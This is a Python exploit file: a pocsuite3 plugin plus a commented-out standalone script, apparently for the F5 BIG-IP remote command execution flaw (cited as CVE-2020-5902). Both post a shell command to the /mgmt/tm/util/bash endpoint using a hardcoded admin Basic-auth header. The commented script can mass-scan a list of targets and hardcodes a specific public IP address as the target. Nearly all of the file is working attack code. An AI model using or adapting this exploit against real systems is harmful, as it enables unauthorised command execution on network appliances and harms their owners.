# import requests
# import sys
# import random
# import re
# import json
# from requests.packages.urllib3.exceptions import InsecureRequestWarning
#
# def title():
#     print('+------------------------------------------')
#     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
#     print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
#     print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
#     print('+  \033[34mVersion: F5 BIG-IP                                                  \033[0m')
#     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
#     print('+  \033[36mFile         >>> ip.txt                             \033[0m')
#     print('+------------------------------------------')
#
# def POC_1(target_url):
#     vuln_url = target_url + "/mgmt/tm/util/bash"
#     headers = {
#         "Authorization": "Basic YWRtaW46QVNhc1M=",
#         "X-F5-Auth-Token": "",
#         "Content-Type": "application/json"
#     }
#     data = '{"command":"run","utilCmdArgs":"-c id"}'
#     try:
#         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
#         response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
#         if "commandResult" in response.text and response.status_code == 200:
#             print("\033[32m[o] 目标 {}存在漏洞,响应为:{} \033[0m".format(target_url, json.loads(response.text)["commandResult"]))
#         else:
#             print("\033[31m[x] 目标 {}不存在漏洞 \033[0m".format(target_url))
#     except Exception as e:
#         print("\033[31m[x] 目标 {} 请求失败 \033[0m".format(target_url))
#
# def Scan(file_name):
#     with open(file_name, "r", encoding='utf8') as scan_url:
#         for url in scan_url:
#             if url[:4] != "http":
#                 url = "https://" + url
#             url = url.strip('\n')
#             try:
#                 POC_1(url)
#
#             except Exception as e:
#                 print("\033[31m[x] 请求报错 \033[0m".format(e))
#                 continue
#
# if __name__ == '__main__':
#     # title()
#     # file_name  = str(input("\033[35mPlease input Attack File\nFile >>> \033[0m"))
#     url = "https://179.127.248.26:4443"
#     POC_1(url)



from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import json

# 关于类的继承
class NetMizerpoc(POCBase):
    # fofa语句: title="NetMizer 日志管理系统"
    vulID = "2022071705"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "yuema"  # PoC作者的大名
    vulDate = "2021-9-24"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-07-17"  # 编写 PoC 的日期
    updateDate = "2022-07-17"  # PoC 更新的时间,默认和编写时间一样
    references = ["http://wiki.xypbk.com/Web%E5%AE%89%E5%85%A8/F5%20BIG-IP/%EF%BC%88CVE-2020-5902%EF%BC%89F5%20BIG-IP%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"]  # 漏洞地址来源,0day不用写
    name = "F5 BIG-IP 远程命令执行漏洞 PoC"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "F5 BIG-IP"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """本次漏洞位于F5 BIG-IP产品，流量管理用户页面（TMUI）存在认证绕过漏洞（CVE-2020-5902）,漏洞影响范围包括执行任意系统命令、任意文件读取、任意文件写入、开启/禁用服务等"""  # 漏洞简要描述
    pocDesc = """直接调用"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        url = self.url.strip()
        full_url = f"{url}/mgmt/tm/util/bash"
        headers = {"Connection": "close", "Cache-Control": "max-age=0", "Authorization": "Basic YWRtaW46QVNhc1M=",
                         "X-F5-Auth-Token": "", "Upgrade-Insecure-Requests": "1", "Content-Type": "application/json"}
        json = {"command": "run", "utilCmdArgs": "-c id"}
        result = []
        try:
            response = requests.post(url=full_url, json=json, headers=headers, verify=False, timeout=5)
            if "commandResult" in response.text and response.status_code == 200:
                # print(f"响应为:{json.loads(response.text)['commandResult']}")
                result.append(url)
        except Exception as e:
            print(e)
        # 跟 try ... except是一对的 , 最终一定会执行里面的代码 , 不管你是否报错
        finally:
            return result
    def _verify(self):
        # 验证模式 , 调用检查代码 ,
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        # 攻击模式 , 就是在调用验证模式
        return self._verify()

    def parse_verify(self, result):
        # 解析认证 , 输出
        output = Output(self)
        # 根据result的bool值判断是否有漏洞
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output

# 你会发现没有shell模式 , 对吧 ,根本就用不到

# 其他自定义的可添加的功能函数
def other_fuc():
    pass

# 其他工具函数
def other_utils_func():
    pass


# 注册 DemoPOC 类 , 必须要注册
register_poc(NetMizerpoc)


